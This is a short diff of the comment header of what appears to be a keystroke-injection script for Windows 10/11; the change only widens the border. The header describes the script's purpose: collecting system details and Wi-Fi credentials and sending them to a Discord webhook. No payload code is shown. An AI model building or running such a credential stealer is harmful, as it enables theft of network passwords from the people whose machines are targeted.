@@ -1,11 +1,11 @@
-REM ┌──────────────────────────────────────────────┐
+REM ┌─────────────────────────────────────────────────┐
 REM │ hooker01 | github.com/hooker01                  │
 REM │ Description: Collects system, hardware, network │
 REM │ and Wi-Fi credentials, then sends a detailed    │
 REM │ report to a specified Discord webhook.          │
 REM │ The output is truncated to fit Discord limits.  │
 REM │ Target: Windows 10/11                           │
-REM └──────────────────────────────────────────────┘
+REM └─────────────────────────────────────────────────┘
 
 
 ESC
